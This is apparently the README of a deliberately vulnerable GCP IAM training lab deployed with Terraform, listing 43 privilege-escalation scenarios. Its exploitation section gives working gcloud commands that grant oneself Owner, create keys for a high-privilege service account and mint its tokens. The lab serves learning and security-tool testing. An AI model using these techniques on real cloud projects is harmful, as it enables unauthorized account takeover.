# GCP IAM Vulnerable

Intentionally vulnerable GCP IAM configurations for learning privilege escalation and testing security tools.

## Prerequisites

1. **GCP Project**: An isolated test project with no production resources
2. **gcloud CLI**: Installed and configured
3. **Terraform**: Version 1.0+
4. **Permissions**: Owner or IAM Admin role on the project

## Quick Start

```bash
# Authenticate with GCP
gcloud auth login
gcloud auth application-default login

# Set your project
export PROJECT_ID="your-test-project-id"
gcloud config set project $PROJECT_ID

# Enable Service Usage API (required for Terraform to enable other APIs)
gcloud services enable serviceusage.googleapis.com --project $PROJECT_ID

# Configure your project
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars and set gcp_project_id to your project ID

# Deploy (use -parallelism=2 to avoid GCP rate limits on service account creation)
terraform init
terraform apply -parallelism=2
```

**APIs enabled automatically by Terraform:**
- `iam.googleapis.com` - IAM API
- `cloudresourcemanager.googleapis.com` - Resource Manager API
- `compute.googleapis.com` - Compute Engine API
- `cloudfunctions.googleapis.com` - Cloud Functions API
- `cloudbuild.googleapis.com` - Cloud Build API
- `run.googleapis.com` - Cloud Run API
- `storage.googleapis.com` - Cloud Storage API
- `secretmanager.googleapis.com` - Secret Manager API

## Configuration

Edit `terraform.tfvars`:

```hcl
# Required: Your GCP project ID
gcp_project_id = "your-test-project-id"

# Optional: Region (default: us-central1)
gcp_region = "us-central1"

# Optional: Attacker identity (defaults to current user)
# attacker_member = "user:attacker@example.com"

# Optional: Create the project if it doesn't exist (requires billing account)
# create_project  = true
# billing_account = "XXXXXX-XXXXXX-XXXXXX"

# Optional: Organization ID for org-level privesc paths
# Note: Orgs can't be created via Terraform - requires Google Workspace/Cloud Identity
# gcp_organization_id = "123456789012"
```

### Optional: Auto-Create Project

If you don't have an existing project, Terraform can create one for you:

1. **Get your billing account ID:**
   ```bash
   gcloud billing accounts list
   ```

2. **Configure terraform.tfvars:**
   ```hcl
   gcp_project_id = "my-iam-vulnerable-test"  # Must be globally unique
   create_project = true
   billing_account = "XXXXXX-XXXXXX-XXXXXX"

   # Optional: Create under an organization (otherwise creates standalone project)
   # gcp_organization_id = "123456789012"
   ```

3. **Deploy:**
   ```bash
   terraform apply -parallelism=2
   ```

**Notes:**
- Project IDs must be globally unique across all of GCP
- A billing account is required even for free-tier resources (to enable APIs)
- Without an organization, the project is created as a "no organization" standalone project

### Optional: Setting Up a GCP Organization with Cloud Identity Free

> **Note:** A GCP Organization is **not required** for most privilege escalation paths in this project. Only org-level paths like `orgpolicy.policy.set` (privesc42) require an organization to fully exploit. Skip this section if you just want to test project-level privesc.

GCP Organizations cannot be created directly - they're automatically provisioned when you verify domain ownership through Google Workspace or Cloud Identity. Here's how to set one up for free using Cloud Identity Free:

#### Prerequisites

- A domain you own (e.g., `yourdomain.com`)
- Access to your domain's DNS settings
- A Google account

#### Step 1: Sign Up for Cloud Identity Free

1. Go to [Cloud Identity Free signup](https://workspace.google.com/signup/gcpidentity/welcome)
2. Click **Get Started**
3. Enter your business name (can be anything for testing)
4. Select **Just you** for number of employees
5. Enter your contact information
6. Enter your domain name (e.g., `yourdomain.com`)

#### Step 2: Verify Domain Ownership

Google will ask you to verify you own the domain. Choose one method:

**Option A: TXT Record (Recommended)**
1. Copy the TXT verification record Google provides
2. Add it to your domain's DNS settings:
   ```
   Type: TXT
   Host: @ (or leave blank)
   Value: google-site-verification=XXXXXXXXXXXXX
   ```
3. Wait 5-15 minutes for DNS propagation
4. Click **Verify** in the Cloud Identity setup

**Option B: CNAME Record**
1. Add the CNAME record Google provides to your DNS
2. Wait for propagation and verify

#### Step 3: Complete Setup

1. Create your admin account (e.g., `admin@yourdomain.com`)
2. Set a password
3. Skip optional setup steps (you can configure later)
4. Accept the terms of service

#### Step 4: Get Your Organization ID

Once setup completes, a GCP Organization is automatically created:

```bash
# List organizations you have access to
gcloud organizations list

# Output:
# DISPLAY_NAME     ID              DIRECTORY_CUSTOMER_ID
# yourdomain.com   123456789012    C0xxxxxxx
```

#### Step 5: Configure Terraform

Add your organization ID to `terraform.tfvars`:

```hcl
gcp_organization_id = "123456789012"
```

#### Step 6: Grant Organization-Level Permissions

For org-level privesc paths to work, grant yourself Organization Admin:

```bash
# Get your organization ID
ORG_ID=$(gcloud organizations list --format='value(ID)' --limit=1)

# Grant yourself Organization Administrator
gcloud organizations add-iam-policy-binding $ORG_ID \
  --member="user:your-email@gmail.com" \
  --role="roles/resourcemanager.organizationAdmin"
```

#### Cloud Identity Free Limits

- Up to 50 users (plenty for testing)
- No cost for the identity service
- Full GCP Organization functionality
- No Google Workspace apps (Gmail, Docs, etc.) - just identity management

#### Cleanup

To delete the organization later:
1. Go to [Google Admin Console](https://admin.google.com)
2. Account > Account settings > Delete account
3. This removes the organization and all associated resources

## What Gets Created

### Free Resources (Default)

**43 Privilege Escalation Scenarios** grouped by GCP service:

| # | Scenario | Permission(s) | Exploit Cost | Status |
|---|----------|---------------|--------------|--------|
| **IAM Service Account** | | | | |
| 1 | setIamPolicy-project | `resourcemanager.projects.setIamPolicy` | Free | Enabled |
| 2 | createServiceAccountKey | `iam.serviceAccountKeys.create` | Free | Enabled |
| 3 | setIamPolicy-serviceAccount | `iam.serviceAccounts.setIamPolicy` | Free | Enabled |
| 4 | getAccessToken | `iam.serviceAccounts.getAccessToken` | Free | Enabled |
| 5 | signBlob | `iam.serviceAccounts.signBlob` | Free | Enabled |
| 6 | signJwt | `iam.serviceAccounts.signJwt` | Free | Enabled |
| 7 | implicitDelegation | `iam.serviceAccounts.implicitDelegation` | Free | Enabled |
| 8 | getOpenIdToken | `iam.serviceAccounts.getOpenIdToken` | Free | Enabled |
| 9 | updateRole | `iam.roles.update` | Free | Enabled |
| **Compute Engine** | | | | |
| 10 | actAs-compute | `actAs` + `compute.instances.create` | ~$0.01/hr | Enabled |
| 11 | setMetadata-compute | `compute.instances.setMetadata` | ~$2-5/mo | Disabled |
| 12 | osLogin | `compute.instances.osAdminLogin` | ~$2-5/mo | Disabled |
| 13 | setServiceAccount | `compute.instances.setServiceAccount` | ~$2-5/mo | Disabled |
| 14 | instanceTemplates.create | `compute.instanceTemplates.create` | ~$0.01/hr | Enabled |
| **Cloud Functions** | | | | |
| 15 | actAs-cloudfunction | `actAs` + `cloudfunctions.functions.create` | Free tier | Enabled |
| 16 | updateFunction | `cloudfunctions.functions.update` | Free | Disabled |
| 17 | sourceCodeSet | `cloudfunctions.functions.sourceCodeSet` | Free | Disabled |
| **Cloud Run** | | | | |
| 18 | actAs-cloudrun | `actAs` + `run.services.create` | Free tier | Enabled |
| 19 | run.services.update | `run.services.update` | Free | Disabled |
| 20 | run.jobs.create | `run.jobs.create` + `actAs` | Free tier | Enabled |
| **Cloud Build** | | | | |
| 21 | actAs-cloudbuild | `actAs` + `cloudbuild.builds.create` | Free tier | Enabled |
| 22 | cloudbuild.triggers.create | `cloudbuild.builds.create` via trigger | Free | Enabled |
| **Storage** | | | | |
| 23 | setIamPolicy-bucket | `storage.buckets.setIamPolicy` | Free | Enabled |
| 24 | storage.objects.create | Write to sensitive bucket | Free | Enabled |
| **Secret Manager** | | | | |
| 25 | secretManager | `secretmanager.versions.access` | Free | Enabled |
| 26 | secretManager.setIamPolicy | `secretmanager.secrets.setIamPolicy` | Free | Enabled |
| **Pub/Sub** | | | | |
| 27 | setIamPolicy-pubsub | `pubsub.topics.setIamPolicy` | Free | Enabled |
| **Cloud Scheduler** | | | | |
| 28 | cloudScheduler | `cloudscheduler.jobs.create` | Free tier | Enabled |
| **Deployment Manager** | | | | |
| 29 | deploymentManager | `deploymentmanager.deployments.create` | Free | Enabled |
| **Composer** | | | | |
| 30 | composer | `composer.environments.create` | ~$300/mo | Enabled |
| **Dataflow** | | | | |
| 31 | dataflow | `dataflow.jobs.create` | ~$0.05/hr | Enabled |
| **Dataproc** | | | | |
| 32 | dataproc.clusters.create | `dataproc.clusters.create` + `actAs` | ~$0.10/hr | Enabled |
| 33 | dataproc.jobs.create | `dataproc.jobs.create` | Free | Enabled |
| **GKE/Kubernetes** | | | | |
| 34 | container.clusters.create | `container.clusters.create` + `actAs` | ~$70/mo | Enabled |
| 35 | container.clusters.getCredentials | Access GKE cluster | Free | Enabled |
| **Vertex AI / AI Platform** | | | | |
| 36 | notebooks.instances.create | `notebooks.instances.create` + `actAs` | ~$25/mo | Enabled |
| 37 | aiplatform.customJobs.create | `aiplatform.customJobs.create` | Varies | Enabled |
| **Cloud Workflows** | | | | |
| 38 | workflows.workflows.create | `workflows.workflows.create` + `actAs` | Free tier | Enabled |
| **Eventarc** | | | | |
| 39 | eventarc.triggers.create | `eventarc.triggers.create` | Free | Enabled |
| **BigQuery** | | | | |
| 40 | bigquery.datasets.setIamPolicy | `bigquery.datasets.setIamPolicy` | Free | Enabled |
| **Workload Identity** | | | | |
| 41 | workloadIdentityPoolProviders | Federation abuse | Free | Enabled |
| **Org Policy** | | | | |
| 42 | orgpolicy.policy.set | `orgpolicy.policy.set` | Free | Disabled |
| **Deny Bypass** | | | | |
| 43 | explicitDeny-bypass | SA chaining | Free | Enabled |

> **Status Legend:**
> - **Enabled** = IAM resources created by default, exploitable immediately
> - **Disabled** = Requires opt-in variable (see below)
>
> **Disabled Paths - Enable individually:**
> | Path | Variable | Creates | Cost |
> |------|----------|---------|------|
> | 11 | `enable_privesc11 = true` | VM + IAM | ~$2-5/mo |
> | 12 | `enable_privesc12 = true` | VM + IAM | ~$2-5/mo |
> | 13 | `enable_privesc13 = true` | VM + IAM | ~$2-5/mo |
> | 16 | `enable_privesc16 = true` | Function + IAM | Free (idle) |
> | 17 | `enable_privesc17 = true` | Function + IAM | Free (idle) |
> | 19 | `enable_privesc19 = true` | Cloud Run + IAM | Free (idle) |
> | 42 | `enable_privesc42 = true` | IAM only | Free (requires `gcp_organization_id`) |
>
> **Note:** "Exploit Cost" is what it costs to actually exploit the path. "Enabled" paths create only IAM resources (free) but exploitation may create billable resources (e.g., privesc10 creates a VM when exploited).

**Tool Testing Resources:**
- False Negative tests (should be detected)
- False Positive tests (should not be flagged)

### Disabled Privesc Paths (Optional)

Some privesc paths are disabled by default because they require target infrastructure (costs money) or a GCP Organization. Enable individually in `terraform.tfvars`:

```hcl
gcp_project_id = "your-test-project-id"

# Compute-based paths (creates VM, ~$2-5/mo)
enable_privesc11 = true  # setMetadata-compute
enable_privesc12 = true  # osLogin
enable_privesc13 = true  # setServiceAccount

# Cloud Functions paths (creates function, free when idle)
enable_privesc16 = true  # updateFunction
enable_privesc17 = true  # sourceCodeSet

# Cloud Run paths (creates service, free when idle)
enable_privesc19 = true  # run.services.update

# Organization paths (requires gcp_organization_id)
# gcp_organization_id = "123456789012"
# enable_privesc42 = true  # orgpolicy.policy.set
```

**Or via command line:**
```bash
terraform apply -parallelism=2 -var="enable_privesc11=true" -var="enable_privesc12=true" -var="gcp_project_id=iam-vulnerable"

# With organization (for privesc42)
terraform apply -parallelism=2 -var="gcp_project_id=iam-vulnerable" -var="gcp_organization_id=123456789012" -var="enable_privesc42=true"
```

## Cost Summary

| Configuration | Cost/Hour | Cost/Month |
|---------------|-----------|------------|
| **Default (43 IAM paths only)** | **$0.00** | **$0** |
| + Compute module (preemptible) | +$0.002 | +$2-3 |
| + Compute module (standard) | +$0.008 | +$6-7 |
| + Cloud Functions (idle) | +$0.00 | Free tier |
| + Cloud Run (idle) | +$0.00 | Free tier |
| **All modules enabled** | ~$0.01 | ~$5-10 |

**Note:** The default deployment creates only IAM resources (service accounts, custom roles, IAM bindings) which are **completely free**. Non-free modules must be explicitly enabled.

## Testing with FoxMapper

```bash
# Create a graph of your vulnerable project
foxmapper gcp graph create --project YOUR_PROJECT_ID

# Find privilege escalation paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID

# Find multiple paths
foxmapper gcp argquery --preset privesc --project YOUR_PROJECT_ID --paths 3

# List all admins
foxmapper gcp argquery --preset admin --project YOUR_PROJECT_ID
```

## Troubleshooting

### Rate Limit Errors (429 - Service Accounts per Minute)

GCP limits service account creation to ~5-10 per minute per project. **Always use `-parallelism=2`** to avoid hitting this limit:

```bash
# Recommended for all runs
terraform apply -parallelism=2

# Or for very strict rate limiting, use parallelism=1
terraform apply -parallelism=1
```

The Terraform configuration includes batched delays, but on retries after errors the delays have already completed and pending resources try to create at once. Using `-parallelism=2` prevents this.

### Cloud Functions Build Errors

If you see errors about bucket access being denied for the compute service account:

```
Access to bucket gcf-sources-XXXXX denied. You must grant Storage Object Viewer permission
```

This is usually an IAM propagation delay. The fix has been applied (90s wait), but if it still fails:

```bash
# Wait a minute, then re-apply
sleep 60 && terraform apply -parallelism=2
```

### Organization Policy Errors

The `orgpolicy.policy.set` permission cannot be used in custom roles - this is a GCP limitation. The privesc42 path uses the predefined `roles/orgpolicy.policyAdmin` role instead.

**Note:** Actually modifying organization policies requires:
1. A GCP Organization (tied to a verified domain via Google Workspace or Cloud Identity)
2. The role granted at the organization level, not just project level

Set the optional `gcp_organization_id` variable if you have an org and want full functionality.

## Cleanup

### Standard Cleanup

```bash
terraform destroy
```

### When Terraform State is Lost

```bash
cd cleanup-scripts

# Preview what will be deleted
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID --dry-run

# Execute cleanup
./cleanup_iam_vulnerable.sh --project YOUR_PROJECT_ID
```

## Security Warning

**These resources are intentionally insecure.** Only deploy in:
- Isolated test projects
- Projects with no sensitive data
- Projects not connected to production systems

## Exploitation Quick Start

This section provides a quick introduction to exploiting the privilege escalation paths. For complete step-by-step instructions for all 43 scenarios, see [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md).

### How It Works

Each privesc path follows this pattern:
1. **Attacker** (you) can impersonate a **vulnerable service account**
2. The **vulnerable SA** has permissions that allow escalation to a **high-privilege SA**
3. The **high-privilege SA** (`privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com`) has Owner role

### Basic Impersonation

```bash
# Set your project
export PROJECT_ID="your-project-id"

# Method 1: Set impersonation globally
gcloud config set auth/impersonate_service_account SERVICE_ACCOUNT_EMAIL

# Method 2: Per-command impersonation
gcloud COMMAND --impersonate-service-account=SERVICE_ACCOUNT_EMAIL

# Method 3: Generate access token
gcloud auth print-access-token --impersonate-service-account=SERVICE_ACCOUNT_EMAIL
```

### Example: Path 1 - setIamPolicy on Project

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc1-set-iam-policy@$PROJECT_ID.iam.gserviceaccount.com

# Get current IAM policy
gcloud projects get-iam-policy $PROJECT_ID --format=json > policy.json

# Edit policy.json to add yourself as Owner, then apply
gcloud projects set-iam-policy $PROJECT_ID policy.json

# Clear impersonation
gcloud config unset auth/impersonate_service_account
```

### Example: Path 2 - Create Service Account Key

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc2-create-key@$PROJECT_ID.iam.gserviceaccount.com

# Create a key for the high-priv SA
gcloud iam service-accounts keys create key.json \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Activate the stolen key
gcloud config unset auth/impersonate_service_account
gcloud auth activate-service-account --key-file=key.json
```

### Example: Path 4 - getAccessToken

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc4-get-access-token@$PROJECT_ID.iam.gserviceaccount.com

# Generate token for high-priv SA (vulnerable SA has Token Creator role)
gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
```

### Next Steps

See [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md) for:
- Detailed exploitation steps for all 43 scenarios
- Service-specific attack patterns (Compute, Functions, Run, Build, etc.)
- Quick reference table of all service account emails

## Architecture

```
gcp/
├── main.tf                    # Root configuration
├── variables.tf               # Input variables
├── outputs.tf                 # Output values
├── terraform.tfvars.example   # Example configuration
├── cleanup-scripts/           # Manual cleanup tools
│   ├── CLEANUP_README.md
│   ├── cleanup_iam_vulnerable.sh
│   └── cleanup_iam_vulnerable.py
└── modules/
    ├── free-resources/
    │   ├── privesc-paths/     # 43 privilege escalation paths
    │   │   ├── common.tf      # Shared resources
    │   │   ├── privesc1-*.tf  # Individual paths
    │   │   └── ...
    │   └── tool-testing/      # FN/FP test cases
    └── non-free-resources/
        ├── compute/           # GCE instance
        ├── cloud-functions/   # Cloud Functions
        └── cloud-run/         # Cloud Run service
```

## References

- [Privilege Escalation in GCP](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
- [GCP IAM Roles](https://cloud.google.com/iam/docs/understanding-roles)
- [Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [FoxMapper Documentation](https://github.com/BishopFox/foxmapper)
